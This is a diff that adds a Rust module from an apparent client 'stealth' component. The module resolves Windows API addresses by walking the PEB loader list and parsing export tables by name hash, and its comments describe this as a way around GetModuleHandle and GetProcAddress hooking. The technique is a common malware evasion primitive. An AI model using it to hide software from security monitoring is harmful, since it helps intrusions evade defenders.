@@ -1,0 +1,151 @@
+// Client/core/src/stealth/peb.rs
+// Position Independent API Resolution via PEB Walking
+
+use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY};
+#[cfg(target_arch = "x86_64")]
+use winapi::um::winnt::IMAGE_NT_HEADERS64 as IMAGE_NT_HEADERS;
+#[cfg(target_arch = "x86")]
+use winapi::um::winnt::IMAGE_NT_HEADERS32 as IMAGE_NT_HEADERS;
+use super::hash_module_name;
+
+/// PEB Walking: Returns the base address of a loaded module by its name hash.
+/// Completely bypasses GetModuleHandle hooking.
+#[cfg(windows)]
+pub unsafe fn get_module_base(name_hash: u32) -> usize {
+    #[repr(C)]
+    struct UNICODE_STRING {
+        length: u16,
+        maximum_length: u16,
+        buffer: *mut u16,
+    }
+
+    #[repr(C)]
+    struct LDR_DATA_TABLE_ENTRY {
+        in_load_order_links: winapi::shared::ntdef::LIST_ENTRY,
+        in_memory_order_links: winapi::shared::ntdef::LIST_ENTRY,
+        in_initialization_order_links: winapi::shared::ntdef::LIST_ENTRY,
+        dll_base: *mut winapi::ctypes::c_void,
+        entry_point: *mut winapi::ctypes::c_void,
+        size_of_image: u32,
+        full_dll_name: UNICODE_STRING,
+        base_dll_name: UNICODE_STRING,
+    }
+
+    let peb: *const usize;
+    #[cfg(target_arch = "x86_64")]
+    std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
+    #[cfg(target_arch = "x86")]
+    std::arch::asm!("mov {}, fs:[0x30]", out(reg) peb);
+
+    // Ldr = PEB + 0x18 (x64) or + 0x0c (x86)
+    let ldr = *(peb.add(3) as *const *const usize);
+    
+    // InMemoryOrderModuleList head is Ldr + 0x20 (x64) or + 0x14 (x86)
+    let list_head = if cfg!(target_arch = "x86_64") { ldr.add(4) } else { ldr.add(5) } as *mut winapi::shared::ntdef::LIST_ENTRY;
+    let mut current_node = (*list_head).Flink;
+
+    while current_node != list_head {
+        // InMemoryOrderLinks offset: 0x10 (x64) or 0x08 (x86)
+        let entry_ptr = if cfg!(target_arch = "x86_64") { 
+            (current_node as *const u8).sub(16) 
+        } else { 
+            (current_node as *const u8).sub(8) 
+        };
+        
+        let entry = entry_ptr as *const LDR_DATA_TABLE_ENTRY;
+        let buffer = (*entry).base_dll_name.buffer;
+        let len = (*entry).base_dll_name.length as usize / 2;
+        
+        if !buffer.is_null() && len > 0 {
+            let name = std::slice::from_raw_parts(buffer, len);
+            let mut h: u32 = 0;
+            for &c in name {
+                let lower = if c >= 'A' as u16 && c <= 'Z' as u16 { c + 32 } else { c };
+                h = h.wrapping_mul(31).wrapping_add(lower as u32);
+            }
+            if h == name_hash { return (*entry).dll_base as usize; }
+        }
+
+        current_node = (*current_node).Flink;
+    }
+    0
+}
+
+/// Dynamic Export Parsing: Find function address by name hash.
+/// Completely bypasses GetProcAddress hooking.
+#[cfg(windows)]
+pub unsafe fn get_api_addr(module_ptr: usize, func_hash: u32) -> Option<usize> {
+    if module_ptr == 0 { return None; }
+    let dos_header = module_ptr as *const IMAGE_DOS_HEADER;
+    if (*dos_header).e_magic != 0x5A4D { return None; }
+
+    let nt_headers = (module_ptr + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS;
+    let export_dir_rva = (*nt_headers).OptionalHeader.DataDirectory[0].VirtualAddress as usize;
+    if export_dir_rva == 0 { return None; }
+
+    let export_dir = (module_ptr + export_dir_rva) as *const IMAGE_EXPORT_DIRECTORY;
+    let names = (module_ptr + (*export_dir).AddressOfNames as usize) as *const u32;
+    let ordinals = (module_ptr + (*export_dir).AddressOfNameOrdinals as usize) as *const u16;
+    let functions = (module_ptr + (*export_dir).AddressOfFunctions as usize) as *const u32;
+
+    for i in 0..(*export_dir).NumberOfNames {
+        let name_ptr = (module_ptr + *names.add(i as usize) as usize) as *const i8;
+        let mut h: u32 = 0;
+        let mut offset = 0;
+        while *name_ptr.add(offset) != 0 {
+            h = h.wrapping_mul(31).wrapping_add(*name_ptr.add(offset) as u8 as u32);
+            offset += 1;
+        }
+        
+        if h == func_hash {
+            let ordinal = *ordinals.add(i as usize);
+            let func_rva = *functions.add(ordinal as usize) as usize;
+            
+            // 🚨 CRITICAL: Check for Export Forwarding
+            let export_dir_size = (*nt_headers).OptionalHeader.DataDirectory[0].Size as usize;
+            if func_rva >= export_dir_rva && func_rva < export_dir_rva + export_dir_size {
+                let forwarder_name_ptr = (module_ptr + func_rva) as *const i8;
+                let mut forwarder_name = [0u8; 256];
+                let mut j = 0;
+                while *forwarder_name_ptr.add(j) != 0 && j < 255 {
+                    forwarder_name[j] = *forwarder_name_ptr.add(j) as u8;
+                    j += 1;
+                }
+                
+                let s = std::str::from_utf8(&forwarder_name[..j]).ok()?;
+                let p: Vec<&str> = s.split('.').collect();
+                if p.len() == 2 {
+                    let dll_base_name = p[0].to_lowercase();
+                    let mut dll = dll_base_name.clone();
+                    if !dll.ends_with(".dll") { dll.push_str(".dll"); }
+                    
+                    let mut h_dll: u32 = 0;
+                    for b in dll.bytes() {
+                        let lower = if b >= b'A' && b <= b'Z' { b + 32 } else { b };
+                        h_dll = h_dll.wrapping_mul(31).wrapping_add(lower as u32);
+                    }
+                    
+                    let mut target_mod = get_module_base(h_dll);
+                    
+                    // Fallback for common API Sets if not found in PEB yet
+                    if target_mod == 0 && (dll_base_name.starts_with("api-ms-") || dll_base_name.starts_with("ext-ms-")) {
+                         // Try resolving from KERNELBASE directly as it usually hosts these
+                         target_mod = get_module_base(hash_module_name(b"kernelbase.dll"));
+                    }
+
+                    if target_mod != 0 {
+                        let mut h_func: u32 = 0;
+                        for b in p[1].bytes() {
+                            h_func = h_func.wrapping_mul(31).wrapping_add(b as u32);
+                        }
+                        return get_api_addr(target_mod, h_func);
+                    }
+                }
+                return None;
+            }
+            
+            return Some(module_ptr + func_rva);
+        }
+    }
+    None
+}
